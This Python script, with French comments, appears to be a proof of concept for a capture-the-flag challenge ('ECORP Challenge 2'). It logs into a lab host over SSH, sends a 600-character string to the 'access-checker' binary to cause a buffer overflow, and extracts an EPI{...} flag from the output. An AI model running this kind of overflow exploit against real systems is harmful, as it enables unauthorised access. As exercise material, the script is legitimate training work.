#!/usr/bin/env python3
# ================================================
# POC - ECORP Bug Bounty : Challenge 2
# Vulnérabilité : Buffer Overflow sur access-checker
# ================================================

import paramiko
import getpass
import re
import sys
import time

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
BINARY  = "/opt/intern/access-checker"
PAYLOAD = "l" * 600

# ─────────────────────────────────────────────
# ÉTAPE 1 : Connexion SSH
# ─────────────────────────────────────────────
def connect_ssh():
    print("\n[*] Étape 1 : Connexion SSH...")
    ssh_host = input("    Host (ex: ecorp.cyber.epitest.eu) : ").strip()
    ssh_port = int(input("    Port                             : ").strip())
    ssh_user = input("    Utilisateur                      : ").strip()
    ssh_pass = getpass.getpass("    Mot de passe                     : ")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ssh_host, port=ssh_port, username=ssh_user, password=ssh_pass)
        print(f"[+] Connecté en SSH sur {ssh_host}:{ssh_port} !")
        return client
    except Exception as e:
        print(f"[!] Erreur SSH : {e}")
        sys.exit(1)

# ─────────────────────────────────────────────
# ÉTAPE 2 : Recherche du binaire
# ─────────────────────────────────────────────
def find_binary(client):
    print(f"\n[*] Étape 2 : Recherche du binaire access-checker...")
    stdin, stdout, stderr = client.exec_command("find / -name 'access-checker' 2>/dev/null")
    result = stdout.read().decode().strip()
    if result:
        print(f"[+] Binaire trouvé : {result}")
        return result
    print(f"[!] Binaire non trouvé, utilisation du chemin connu.")
    return BINARY

# ─────────────────────────────────────────────
# ÉTAPE 3 : Analyse du binaire
# ─────────────────────────────────────────────
def analyse_binary(client, path):
    print(f"\n[*] Étape 3 : Analyse du binaire...")
    stdin, stdout, stderr = client.exec_command(f"file {path}")
    print(f"[+] {stdout.read().decode().strip()}")

# ─────────────────────────────────────────────
# ÉTAPE 4 : Exploitation — attente du prompt puis envoi payload
# ─────────────────────────────────────────────
def exploit(client, path):
    print(f"\n[*] Étape 4 : Lancement du binaire...")
    print(f"[*] Étape 5 : Exploitation par Buffer Overflow (payload {len(PAYLOAD)} chars)...")

    channel = client.get_transport().open_session()
    channel.set_combine_stderr(True)
    channel.get_pty()  # terminal pseudo-TTY pour que le binaire affiche son prompt
    channel.exec_command(path)

    output = ""
    prompt_detected = False

    # Attente du prompt avant d'envoyer le payload
    for _ in range(50):
        time.sleep(0.1)
        if channel.recv_ready():
            chunk = channel.recv(4096).decode(errors="replace")
            output += chunk
            print(f"[~] Reçu : {chunk.strip()}")
            if "username" in chunk.lower() or ":" in chunk:
                prompt_detected = True
                break

    if prompt_detected:
        print(f"[+] Prompt détecté, envoi du payload...")
        channel.sendall((PAYLOAD + "\n").encode())
    else:
        print(f"[!] Prompt non détecté, envoi du payload quand même...")
        channel.sendall((PAYLOAD + "\n").encode())

    # Lecture de la réponse complète
    time.sleep(1)
    while channel.recv_ready():
        chunk = channel.recv(4096).decode(errors="replace")
        output += chunk

    channel.close()

    print(f"\n[+] Output complet :")
    print(output)
    return output

# ─────────────────────────────────────────────
# ÉTAPE 5 : Extraction du flag
# ─────────────────────────────────────────────
def extract_flag(output):
    print(f"\n[*] Extraction du flag...")
    match = re.search(r'EPI\{[^}]+\}', output)
    if match:
        return match.group(0)
    return None

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
def main():
    print("================================================")
    print("  POC - ECORP Challenge 2 : St4ck Ov3rfl0w")
    print("================================================")

    client      = connect_ssh()
    binary_path = find_binary(client)
    analyse_binary(client, binary_path)
    output      = exploit(client, binary_path)
    flag        = extract_flag(output)

    client.close()

    if flag:
        print(f"\n{'=' * 48}")
        print(f"   FLAG : {flag}")
        print(f"{'=' * 48}")
    else:
        print("[!] Flag non trouvé dans la sortie.")
        print("[~] Output brut :")
        print(repr(output))

if __name__ == "__main__":
    main()